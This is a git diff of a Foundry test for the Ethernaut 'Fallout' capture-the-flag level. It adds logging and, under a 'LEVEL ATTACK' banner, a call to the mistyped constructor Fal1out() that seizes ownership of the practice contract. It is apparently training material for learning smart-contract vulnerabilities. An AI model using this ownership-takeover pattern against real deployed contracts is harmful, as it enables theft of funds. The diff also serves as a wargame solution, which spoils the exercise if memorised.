@@ -4,6 +4,7 @@ import "ds-test/test.sol";
 import "../Fallout/FalloutFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
+import "forge-std/console.sol";
 
 contract FalloutTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
@@ -31,6 +32,10 @@ contract FalloutTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+
+        console.log(ethernautFallout.owner());
+        ethernautFallout.Fal1out();
+        console.log(ethernautFallout.owner());
 
         //////////////////////
         // LEVEL SUBMISSION //
